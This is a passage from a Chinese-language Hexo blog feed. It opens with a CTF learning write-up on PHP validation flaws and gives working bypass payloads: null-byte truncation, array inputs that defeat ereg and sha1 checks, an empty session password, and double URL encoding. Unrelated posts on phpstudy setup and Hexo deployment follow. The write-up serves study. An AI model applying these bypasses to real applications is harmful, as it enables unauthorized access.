<br>        <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-variable">$req</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>); <br>    &#125; <br>&#125; <br> <br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_palindrome_number</span>(<span class="hljs-params"><span class="hljs-variable">$number</span></span>) </span>&#123; <br>    <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$number</span>);<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <br>    <span class="hljs-variable">$j</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>) - <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$j</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span>[<span class="hljs-variable">$i</span>] !== <span class="hljs-variable">$number</span>[<span class="hljs-variable">$j</span>]) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>        <span class="hljs-variable">$i</span>++; <br>        <span class="hljs-variable">$j</span>--; <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>&#125; <br> <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;number&#x27;</span>])) <br>&#123;<br> <br>   <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;sorry, you cann&#x27;t input a number!&quot;</span>;<br> <br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>]!=<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>])))<br>&#123;<br> <br>     <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;number must be equal to it&#x27;s integer!! &quot;</span>;  <br> <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br> <br>     <span class="hljs-variable">$value1</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]);<br>     <span class="hljs-variable">$value2</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]));  <br> <br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value1</span>!=<span class="hljs-variable">$value2</span>)&#123;<br>          <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;no, this is not a palindrome number!&quot;</span>;<br>     &#125;<br>     <span class="hljs-keyword">else</span><br>     &#123;<br> <br>          <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_palindrome_number</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]))&#123;<br>              <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;nice! <span class="hljs-subst">&#123;$value1&#125;</span> is a palindrome number!&quot;</span>; <br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>             <span class="hljs-variable">$info</span>=<span class="hljs-variable">$flag</span>;<br>          &#125;<br>     &#125;<br> <br>&#125;<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$info</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>这个代码好长让我来认真看一下🧐</p><p>从最后看<code>echo $info</code>、<code>$info=$flag</code>，我们知道如果满足前面的条件，flag会被赋值给<code>$info</code>并输出。</p><p>再往上找条件</p><p>要不满足条件，即<code>is_palindrome_number($req[&quot;number&quot;])</code>为假。</p><p>前面代码有写<code>is_palindrome_number</code>函数用来判断回文数字。</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-24-52.png"></p><p>要满足<code>$value1=$value2</code>，即<code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))</code>，$value反转后不能和原来相等。</p><blockquote><p>strrev()函数反转字符串</p></blockquote><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-31-22.png"></p><p><code>is_numberic($REAUEST[&#39;NUMBER&#39;]</code>需要为假，且<code>$req[&#39;number&#39;]==strval(intval(eq[&#39;number&#39;])</code></p><p>再看看上面</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-52-30.png"></p><p>我们要在url传入一个名为<strong>number</strong>的变量</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-59-58.png"></p><p>这段的意思是把我们所有的输入收集到$global_var列表里，此时列表**$global_var&#x3D;[<em>$number</em>]<strong>。再进入下一步循环，将键名赋值给$key，变量的值赋值给$value，即</strong>$key&#x3D;0，$value&#x3D;$number**。</p><p>进入循环内部后，trim()函数去除变量首尾的空白字符或其他字符后需满足条件<code>is_string($value) &amp;&amp; $req[$key] = addslashes($value)</code>，即$value为字符串并给字符串加反斜线。</p><p>判断条件如下</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_20-29-48.png"></p><p>综上，要传入一个字符串，字符串不能是数字还必须是整数，不是回文数字还要是回文数字😅。</p><p>悖论！<del>烦死了不做了去暴打出题人</del></p><p>没关系我们可以绕过。</p><p><code>intval()</code>和 <code>is_numeric()</code>函数在开始判断前，会先跳过所有空白字符，但是<code>is_palindrome_number()</code>不会，可以利用这个特点，在一个回文数字之前加上一个空白字符，比如<code>\f121</code>就是<code>%0c121</code></p><p>再用%00绕过<code>is_numeric($_REQUEST[&#39;number&#39;])</code></p><p><strong>最终playload</strong>：<code>?number=%00%0c121</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_21-14-18.png"></p><p>这个怎么还显示代码捏</p><h3 id="05-ereg-x2F-preg-match-正则-00-截断"><a href="#05-ereg-x2F-preg-match-正则-00-截断" class="headerlink" title="05 ereg&#x2F;preg_match 正则 %00 截断"></a>05 ereg&#x2F;preg_match 正则 %00 截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>  &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] &gt; <span class="hljs-number">99999999</span>)<br>   &#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-string">&#x27;*-*&#x27;</span>) !== <span class="hljs-literal">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span><br>      &#123;<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span> . <span class="hljs-variable">$flag</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>); <br>       &#125;<br>      &#125;<br>     <span class="hljs-keyword">else</span> <br>     &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>; <br>      &#125;<br>   &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><h5 id="001-00截断"><a href="#001-00截断" class="headerlink" title="001 %00截断"></a>001 %00截断</h5><p>需要满足条件<code>ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])</code>不为false，即输入的值必须有大小写<strong>字母或者数字</strong>。</p><p>还需满足<code>strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 99999999</code>，即输入值<strong>长度小于8</strong>且<strong>大于99999999</strong>。</p><p>最后要满足<code>strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE</code>，也就是输入中必须有***-***。但是这条和第一条相悖，不慌，姐已经见过大世面了，姐可以绕过它。</p><blockquote><p>当ereg语句遇到%00的时候就会认为是休止符，不再往后看</p></blockquote><p>可以在字符串中添加%00，在它之后加*-*，骗一下第一个判断条件。</p><p>第二个条件可以使用科学计数法，比如1e10。</p><p><strong>最终playload</strong>：<code>?password=1e10%00*-*</code></p><p>本地复现没成功，我好得很哇我好的很哇😅</p><h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-17-52.png"></p><p>本地复现不成功是打不倒我的，我擅长使用百度。</p><p>翻译了一下是“调用了未定义函数”。在php5.3以上的版本将不再支持eregi()和ereg()函数，看了一下的我的版本号是7.3。</p><p>问题也不是不可避免，只需要改一下格式，把<code>ereg()</code>改成<code>erge_match()</code>就行。</p><p><del>但我不会改</del>😣</p><h4 id="002-数组绕过-1"><a href="#002-数组绕过-1" class="headerlink" title="002 数组绕过"></a>002 数组绕过</h4><p>冲浪冲到的另外一种方法</p><p>在true和false之外还有一个返回值是null。可以利用这一特点进行绕过。</p><p>ereg() 只能处理字符串，遇到数组会返回null，而且<code>null !== false</code>。同时，strlen()也不能处理数组，也会返回null，null的长度小于8。</p><p>因为要输入数组，数组大于整数，所以一定会返回true。</p><p><strong>最终playload</strong>：<code>?password=[]=1</code></p><h3 id="06-sha-函数比较绕过"><a href="#06-sha-函数比较绕过" class="headerlink" title="06 sha()函数比较绕过"></a>06 sha()函数比较绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifer终将否极泰来&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>要满足两个条件：<code>($_GET[&#39;name&#39;] ！== $_GET[&#39;password&#39;]</code>和</p><p><code>sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;])</code>。</p><p>就是要让输入的两个变量不相等但是sha1加密后相等。</p><p>不同的字符串经过sha1加密后一定不同，但是sha1不能加密数组，会报错返回null，如果让两个变量同时返回null就会相等辣。</p><p><strong>最终playload</strong>：<code>?name[]=1&amp;password[]=2</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_20-57-05.png"></p><h3 id="07-session-验证绕过"><a href="#07-session-验证绕过" class="headerlink" title="07 session 验证绕过"></a>07 session 验证绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Modifier终将否极泰来&quot;</span>;<br><br><span class="hljs-title function_ invoke__">session_start</span>(); <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">mt_srand</span>((<span class="hljs-title function_ invoke__">microtime</span>() ^ <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>)) % <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>) + <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>要满足条件<code>$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]</code></p><blockquote><p>$_SESSION()存储会话信息</p></blockquote><p>这里session中的password需要我们自己传入，如果不传就是null，同时password也传空，二者就相等啦</p><p><strong>最终playload</strong>：<code>?password=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-02_21-40-38.png"></p><h3 id="08-urldecode-二次编码绕过"><a href="#08-urldecode-二次编码绕过" class="headerlink" title="08 urldecode 二次编码绕过"></a>08 urldecode 二次编码绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;hackerDJ&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] == <span class="hljs-string">&quot;hackerDJ&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h5><p>需要满足两个条件：<code>eregi(&quot;hackerDJ&quot;,$_GET[&#39;id&#39;])</code>为false；经过urldecode编码后满足<code>$_GET[&#39;id&#39;] == &quot;hackerDJ&quot;</code></p><p>也就是说传入值不能是hackerDJ，但是传入值<strong>经过urldecode解码后</strong>要和hackerDJ相等。</p><p>所以传入时要将hackerDJ的url编码再编码一次。</p><p><strong>最终playload</strong>：<code>?id=%2568%2561%2563%256b%2544%254a</code></p><hr><p>总觉得少了点什么原来是把这个笔记忘记喽</p><p>发上来防止自己手贱删掉🦭</p><p>把万师傅的原博放这里</p><p><a href="https://drun1baby.github.io/2022/08/17/PHP-%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">PHP 入门基础漏洞 | 芜风 (drun1baby.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在浏览器打开本地PHP文件</title>
    <link href="/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/"/>
    <url>/2023/02/28/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>随机掉落废物Mod研究php的笔记😮</p><span id="more"></span><h2 id="01-配置PHP运行环境"><a href="#01-配置PHP运行环境" class="headerlink" title="01 配置PHP运行环境"></a>01 配置PHP运行环境</h2><p>万能的互联网教我下载Apache，PHP和MySQL。好多好麻烦。我选择直接用集成环境。</p><p><a href="https://www.xp.cn/">phpstudy官网</a></p><p>直接去官网下载，会有一个压缩包，解压以后打开第一个exe文件安装就好。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-04-46.png"></p><p>注意：压缩包保存的路径不能有中文和空格</p><p>在安装时的自定义选项中可以修改安装包的位置，我的是默认在D盘根目录，把它改到放压缩包的文件夹里了。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-06-25.png"></p><p>根据本人尝试，在浏览器看PHP文件只需要把Apache打开就行。</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-32-00.png"></p><h2 id="02-把文件丢进网站根目录"><a href="#02-把文件丢进网站根目录" class="headerlink" title="02 把文件丢进网站根目录"></a>02 把文件丢进网站根目录</h2><p>在上述安装步骤步骤中，会生成<strong>phpstudy_pro</strong>文件夹，文件夹中又有<strong>WWW</strong>文件夹。</p><p>网站根目录就是www文件下，必须将文件放置此位置才算有效，否则无法运行php文件。</p><h2 id="03-运行PHP文件"><a href="#03-运行PHP文件" class="headerlink" title="03 运行PHP文件"></a>03 运行PHP文件</h2><p>打开浏览器，在导航栏输入<code>localhost/[文件名]</code>就可以啦</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-42-05.png"></p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_20-41-36.png"></p><h2 id="04-土狗发言"><a href="#04-土狗发言" class="headerlink" title="04 土狗发言"></a>04 土狗发言</h2><p>因为有一个文件写错了，在浏览器打开的时候报错了。</p><p>它居然还可以报错！</p><p><img src="/img/%E5%9C%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%93%E5%BC%80%E6%9C%AC%E5%9C%B0PHP%E6%96%87%E4%BB%B6/Snipaste_2023-02-28_21-09-18.png"></p><p>太高级了</p><hr><p>集成环境yyds🥳</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>phpstudy</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo使用记录</title>
    <link href="/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/02/23/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>遇到的一些奇怪问题和修改主题页面的经验✂️</p><span id="more"></span><h2 id="奇怪问题"><a href="#奇怪问题" class="headerlink" title="奇怪问题"></a>奇怪问题</h2><h4 id="插入图片坑"><a href="#插入图片坑" class="headerlink" title="插入图片坑"></a>插入图片坑</h4><p>在最开始写博客的时候，千挑万选找了张美图准备当封面，复制文件地址插入。<code>hexo g</code> <code>hexo s</code>本地预览一切正常，<code>hexo d</code>一条龙推上去发现图片被和谐掉了（<del>不是</del>）</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-13-07.png"></p><p>前去万能的互联网寻找了一下答案，有的说写文章的时候要建一个同名文件夹放图片，有的说要安装插件。</p><p>我当然是选择建文件夹这个更简单的操作。</p><p>在配置文件_config.yml里找到<strong>post_asset_folder</strong>，把false改为true，再次<code>hexo new</code>就建好.md文件和文件夹了。经过本人一顿Ctrl+C和Ctrl+V的操作把原文件和图片移到新的文件，充满信心地再次<code>hexo g</code> <code>hexo d</code></p><p>还是不显示图片</p><p>好的😢<del>一定是图片它真的违禁了</del></p><p>当我再次在互联网搜索时，我发现了一个华点</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-22-06.png"></p><p>这个markdown语法里的图片插入是<code>/</code>，但是我复制的图片路径用的是<code>\</code>！</p><p>我尝试着修改之后再次<code>hexo d</code></p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-30-47.png"></p><p>就这么成功了🤨</p><h4 id="Spawn-failed坑"><a href="#Spawn-failed坑" class="headerlink" title="Spawn failed坑"></a>Spawn failed坑</h4><p>美滋滋发了一篇笔记上来，发现格式有bug，抓紧时间修改。修改之后再次丝滑一条龙上传······</p><p>没丝滑成功</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_20-07-25.png"></p><p>报错喽🥳<del>我面容平和根本就没有在生气</del></p><p>翻译了一下是“请确保您有正确的访问权限”，不会搞。把目光投向万能的互联网，网上说是连接的问题。</p><p>看到一条说因为git 进行<code>push</code>或者<code>hexo d</code>的时候改变了一些.deploy_git文件下的内容，只需要重新down一下就行。</p><p>于是删除.deploy_git文件夹，再次<code>hexo c</code> <code>hexo g</code> <code>hexo d</code>。出现了一个新的.deploy_git文件！</p><p>依旧报错🥀</p><p>又继续冲浪找解决方案，又看到一条说要在_config.yml文件里把<strong>repo</strong>地址改成git地址。我早就改过了但是我发现这个人的<strong>deploy</strong>条目比我多一个<strong>branch</strong>。</p><p>秉承着不错过任何一个细节的态度我在自己的文件里也加上了这条并认真填入master。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-11-55.png"></p><p>保存，<code>hexo d</code>，加载成功？？？</p><p>事情怎会如此简单，我解决完问题才想起要记录一下踩坑新鲜事，于是乎再次<code>hexo d</code>想看看效果。</p><p>又报错了😮我才十八眼神还挺好使的难道刚才是眼花了吗？</p><p>换了个搜索引擎继续搜，看到一个csdn上的讨论，都让修改repo地址。我不信邪继续往下拉，看到一条标签</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_21-17-43.png"></p><p>我脑海中的小灯泡突然就亮了，我回到浏览器看自己的博客，格式已经修改过来了，也就是说那次眼花是真的推上去了。</p><p>Github你不要太荒谬😅</p><h2 id="修改主题配置"><a href="#修改主题配置" class="headerlink" title="修改主题配置"></a>修改主题配置</h2><h4 id="页脚版权声明"><a href="#页脚版权声明" class="headerlink" title="页脚版权声明"></a>页脚版权声明</h4><p>原本的主题页脚，姐不喜欢，这个爱心太不符合姐Bking的人设了。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-35-37.png"></p><p>我想要有个人版权声明的页脚，经过学习掌握版权声明格式后我开始准备大改特改。</p><p>凭借我只有一点知识的脑壳告诉我这种页面要用HTML来写。奈何肚子里墨水太少，只有图纸没有工具没法盖房子<del>（就是不会写代码）</del></p><p>算了，还是求助一下万能互联网吧</p><p>搜到的全是怎么给页脚添加运行时间🥲就是没人教你怎么写版权声明。换个思路，我去抓了一个别人网页的包直接偷现成的。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-52-54.png"></p><p>代码get！</p><p>经过我一番努力，在主题的.yml文件里找到了<strong>footer</strong>部分，非常感谢主题作者的注释写得那么详细，很轻松就找到了HTML代码区。把原来的注释掉，再加上自己copy来的代码。</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-59-56.png"></p><p>一条龙以后美美得到自己喜欢的页脚🤪</p><p><img src="/img/Hexo%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/Snipaste_2023-02-23_22-58-07.png"></p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
      <tag>无用但美丽的技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTML超文本标记语言</title>
    <link href="/2023/01/15/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
